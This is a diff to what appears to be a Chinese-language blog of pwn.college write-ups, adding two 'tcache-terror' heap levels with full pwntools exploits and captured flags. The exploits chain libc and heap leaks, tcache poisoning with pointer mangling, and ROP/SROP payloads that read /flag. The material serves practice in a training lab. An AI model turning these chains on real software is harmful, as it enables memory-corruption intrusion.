@@ -1,7 +1,7 @@
 ---
-title: "Write-ups: Program Security (Dynamic Allocator Misuse) series"
+title: "Write-ups: Program Security (Dynamic Allocator Misuse) series (Completed)"
 published: 2025-09-08
-updated: 2025-10-13
+updated: 2025-10-14
 description: "Write-ups for pwn.college binary exploitation series."
 image: "https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.41yct5dsj8.avif"
 tags: ["Pwn", "Write-ups", "Heap"]
@@ -4708,3 +4708,542 @@ if __name__ == "__main__":
 ## Flag
 
 :spoiler[`pwn.college{ou87E6zOskHpMtWjDb0XpdVk9ub.dVTO0MDL5cTNxgzW}`]
+
+# Level 20.0
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> 16 bytes and a dream.
+
+## Write-up
+
+说实话我没有 get 到这个 description 是什么意思，这 16 bytes 是指什么呢？
+
+感觉这题就是前面所有知识点的综合，并且没有提供后门函数，我选择 ret2libc 然后打 ORW，不过打法多了去了，我只是选一个自认为比较方便的打。另外，这里我除了写了普通 ORW 外还复习了一下 SROP，可以看我 exp 注释掉的部分是普通 ORW 打法。
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    ELF,
+    ROP,
+    SigreturnFrame,
+    args,
+    constants,
+    context,
+    flat,
+    process,
+    raw_input,
+    remote,
+)
+
+FILE = "/challenge/tcache-terror-easy"
+HOST, PORT = "localhost", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+libc = ELF("/challenge/lib/libc.so.6")
+
+
+def malloc(idx, size):
+    target.sendlineafter(b": ", b"malloc")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendlineafter(b"Size: ", str(size).encode())
+
+
+def free(idx):
+    target.sendlineafter(b": ", b"free")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def safe_read(idx, data):
+    target.sendlineafter(b": ", b"safe_read")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendline(data)
+
+
+def safe_write(idx):
+    target.sendlineafter(b": ", b"safe_write")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def quit():
+    target.sendlineafter(b": ", b"quit")
+
+
+def mangle(pos, ptr, shifted=1):
+    if shifted:
+        return pos ^ ptr
+    return (pos >> 12) ^ ptr
+
+
+def demangle(pos, ptr, shifted=1):
+    if shifted:
+        return mangle(pos, ptr)
+    return mangle(pos, ptr, 0)
+
+
+def launch():
+    global target
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+
+def main():
+    launch()
+
+    malloc(0, 0x410)
+    malloc(1, 0)
+    free(0)
+    malloc(0, 0x410)
+    safe_write(0)
+
+    target.recvlines(2)
+    libc.address = int.from_bytes(target.recv(0x8).strip(), "little") - 0x219CE0
+
+    free(1)
+    malloc(0, 0)
+    # raw_input("DEBUG")
+    safe_write(0)
+
+    target.recvlines(2)
+    pos = int.from_bytes(target.recv(0x8).strip(), "little")
+
+    malloc(0, 0x10)
+    malloc(1, 0)
+    malloc(2, 0)
+    malloc(3, 0)
+    free(3)
+    free(2)
+
+    payload = flat(
+        b"A" * 0x10,
+        0,
+        0x41,
+    )
+    safe_read(0, payload)
+
+    free(1)
+    malloc(1, 0x30)
+
+    payload = flat(
+        b"A" * 0x10,
+        0,
+        0x21,
+        mangle(pos, libc.sym["environ"]),
+    )
+    # raw_input("DEBUG")
+    safe_read(1, payload)
+    malloc(0, 0)
+    malloc(0, 0)
+    # raw_input("DEBUG")
+    safe_write(0)
+
+    target.recvlines(2)
+    ret = int.from_bytes(target.recv(0x8).strip(), "little") - 0x120
+    rbp = ret - 0x8
+
+    target.success(f"libc: {hex(libc.address)}")
+    target.success(f"pos: {hex(pos)}")
+    target.success(f"ret: {hex(ret)}")
+
+    malloc(0, 0x10)
+    malloc(1, 0)
+    malloc(2, 0x100)
+    malloc(3, 0x100)
+    free(3)
+    free(2)
+
+    payload = flat(
+        b"A" * 0x10,
+        0,
+        0x221,
+    )
+    # raw_input("DEBUG")
+    safe_read(0, payload)
+
+    free(1)
+    malloc(1, 0x210)
+
+    payload = flat(
+        b"A" * 0x10,
+        0,
+        0x111,
+        mangle(pos, ret - 0x8),
+    )
+    # raw_input("DEBUG")
+    safe_read(1, payload)
+
+    malloc(0, 0x100)
+    raw_input("DEBUG")
+    malloc(0, 0x100)
+
+    rop = ROP(libc)
+
+    # payload = flat(
+    #     # open
+    #     b"/flag\x00\x00\x00",
+    #     rop.rdi.address,
+    #     rbp,
+    #     rop.rsi.address,
+    #     0,
+    #     rop.rax.address,
+    #     constants.SYS_open,
+    #     rop.find_gadget(["syscall", "ret"])[0],
+    #     # read
+    #     rop.rdi.address,
+    #     3,
+    #     rop.rsi.address,
+    #     rbp - 0x100,
+    #     rop.rdx.address,
+    #     0x100,
+    #     rop.rax.address,
+    #     0,
+    #     rop.find_gadget(["syscall", "ret"])[0],
+    #     # write
+    #     rop.rdi.address,
+    #     1,
+    #     rop.rsi.address,
+    #     rbp - 0x100,
+    #     rop.rdx.address,
+    #     0x100,
+    #     rop.rax.address,
+    #     1,
+    #     rop.find_gadget(["syscall", "ret"])[0],
+    # )
+
+    frame = SigreturnFrame()
+
+    frame.rax = constants.SYS_sendfile
+    frame.rdi = 1
+    frame.rsi = 3
+    frame.rdx = ret + 0x18
+    frame.r10 = 0x100
+    frame.rip = rop.find_gadget(["syscall", "ret"])[0]
+
+    payload = flat(
+        # open
+        b"/flag\x00\x00\x00",
+        rop.rdi.address,
+        rbp,
+        rop.rsi.address,
+        0,
+        rop.rax.address,
+        constants.SYS_open,
+        rop.find_gadget(["syscall", "ret"])[0],
+        # read
+        rop.rdi.address,
+        0,
+        rop.rsi.address,
+        rbp - 0x100,
+        rop.rdx.address,
+        0x100,
+        rop.rax.address,
+        0,
+        rop.find_gadget(["syscall", "ret"])[0],
+        # srop
+        rop.rax.address,
+        0xF,
+        rop.rsp.address,
+        rbp - 0x100,
+    )
+
+    # raw_input("DEBUG")
+    safe_read(0, payload)
+    raw_input("DEBUG")
+    quit()
+
+    payload = flat(
+        rop.find_gadget(["syscall", "ret"])[0],
+        frame,
+    )
+    target.send(payload)
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Flag
+
+:spoiler[`pwn.college{4fglWsi6vXF1cQOmxoxHe6iLybu.dZTO0MDL5cTNxgzW}`]
+
+# Level 20.1
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> 16 bytes and a dream.
+
+## Write-up
+
+参见 [Level 20.0](#level-200)。
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    ELF,
+    ROP,
+    SigreturnFrame,
+    args,
+    constants,
+    context,
+    flat,
+    process,
+    raw_input,
+    remote,
+)
+
+FILE = "/challenge/tcache-terror-hard"
+HOST, PORT = "localhost", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+libc = ELF("/challenge/lib/libc.so.6")
+
+
+def malloc(idx, size):
+    target.sendlineafter(b": ", b"malloc")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendlineafter(b"Size: ", str(size).encode())
+
+
+def free(idx):
+    target.sendlineafter(b": ", b"free")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def safe_read(idx, data):
+    target.sendlineafter(b": ", b"safe_read")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendline(data)
+
+
+def safe_write(idx):
+    target.sendlineafter(b": ", b"safe_write")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def quit():
+    target.sendlineafter(b": ", b"quit")
+
+
+def mangle(pos, ptr, shifted=1):
+    if shifted:
+        return pos ^ ptr
+    return (pos >> 12) ^ ptr
+
+
+def demangle(pos, ptr, shifted=1):
+    if shifted:
+        return mangle(pos, ptr)
+    return mangle(pos, ptr, 0)
+
+
+def launch():
+    global target
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+
+def main():
+    launch()
+
+    malloc(0, 0x410)
+    malloc(1, 0)
+    free(0)
+    malloc(0, 0x410)
+    safe_write(0)
+
+    libc.address = int.from_bytes(target.recv(0x8).strip(), "little") - 0x219CE0
+
+    free(1)
+    malloc(0, 0)
+    # raw_input("DEBUG")
+    safe_write(0)
+
+    pos = int.from_bytes(target.recv(0x8).strip(), "little")
+
+    malloc(0, 0x10)
+    malloc(1, 0)
+    malloc(2, 0)
+    malloc(3, 0)
+    free(3)
+    free(2)
+
+    payload = flat(
+        b"A" * 0x10,
+        0,
+        0x41,
+    )
+    # raw_input("DEBUG")
+    safe_read(0, payload)
+
+    free(1)
+    malloc(1, 0x30)
+
+    payload = flat(
+        b"A" * 0x10,
+        0,
+        0x21,
+        mangle(pos, libc.sym["environ"]),
+    )
+    safe_read(1, payload)
+    malloc(0, 0)
+    malloc(0, 0)
+    # raw_input("DEBUG")
+    safe_write(0)
+
+    ret = int.from_bytes(target.recv(0x8).strip(), "little") - 0x120
+    rbp = ret - 0x8
+
+    target.success(f"libc: {hex(libc.address)}")
+    target.success(f"pos: {hex(pos)}")
+    target.success(f"ret: {hex(ret)}")
+
+    malloc(0, 0x10)
+    malloc(1, 0)
+    malloc(2, 0x100)
+    malloc(3, 0x100)
+    free(3)
+    free(2)
+
+    payload = flat(
+        b"A" * 0x10,
+        0,
+        0x221,
+    )
+    # raw_input("DEBUG")
+    safe_read(0, payload)
+
+    free(1)
+    malloc(1, 0x210)
+
+    payload = flat(
+        b"A" * 0x10,
+        0,
+        0x111,
+        mangle(pos, ret - 0x8),
+    )
+    # raw_input("DEBUG")
+    safe_read(1, payload)
+
+    malloc(0, 0x100)
+    raw_input("DEBUG")
+    malloc(0, 0x100)
+
+    rop = ROP(libc)
+
+    # payload = flat(
+    #     # open
+    #     b"/flag\x00\x00\x00",
+    #     rop.rdi.address,
+    #     rbp,
+    #     rop.rsi.address,
+    #     0,
+    #     rop.rax.address,
+    #     constants.SYS_open,
+    #     rop.find_gadget(["syscall", "ret"])[0],
+    #     # read
+    #     rop.rdi.address,
+    #     3,
+    #     rop.rsi.address,
+    #     rbp - 0x100,
+    #     rop.rdx.address,
+    #     0x100,
+    #     rop.rax.address,
+    #     0,
+    #     rop.find_gadget(["syscall", "ret"])[0],
+    #     # write
+    #     rop.rdi.address,
+    #     1,
+    #     rop.rsi.address,
+    #     rbp - 0x100,
+    #     rop.rdx.address,
+    #     0x100,
+    #     rop.rax.address,
+    #     1,
+    #     rop.find_gadget(["syscall", "ret"])[0],
+    # )
+
+    frame = SigreturnFrame()
+
+    frame.rax = constants.SYS_sendfile
+    frame.rdi = 1
+    frame.rsi = 3
+    frame.rdx = ret + 0x18
+    frame.r10 = 0x100
+    frame.rip = rop.find_gadget(["syscall", "ret"])[0]
+
+    payload = flat(
+        # open
+        b"/flag\x00\x00\x00",
+        rop.rdi.address,
+        rbp,
+        rop.rsi.address,
+        0,
+        rop.rax.address,
+        constants.SYS_open,
+        rop.find_gadget(["syscall", "ret"])[0],
+        # read
+        rop.rdi.address,
+        0,
+        rop.rsi.address,
+        rbp - 0x100,
+        rop.rdx.address,
+        0x100,
+        rop.rax.address,
+        0,
+        rop.find_gadget(["syscall", "ret"])[0],
+        # srop
+        rop.rax.address,
+        0xF,
+        rop.rsp.address,
+        rbp - 0x100,
+    )
+
+    # raw_input("DEBUG")
+    safe_read(0, payload)
+    raw_input("DEBUG")
+    quit()
+
+    payload = flat(
+        rop.find_gadget(["syscall", "ret"])[0],
+        frame,
+    )
+    target.send(payload)
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Flag
+
+:spoiler[`pwn.college{I4gOWGlF1e4mxxQJzpY65moHbAQ.ddTO0MDL5cTNxgzW}`]
+
+# 后记
+
+从一开始的对 heap 充满了恐惧，到现在打完这一章也算是小有成就了，真的从来没想过这一天哈哈哈。接下来就可以去打 dynamic-allocator-exploitation chapter 了，据说是 how2heap 里面各种手法的实践。感觉难度一下就上了好几个台阶，不过我已经克服恐惧了，只是不知道能不能在一个月内打完，让我们拭目以待。
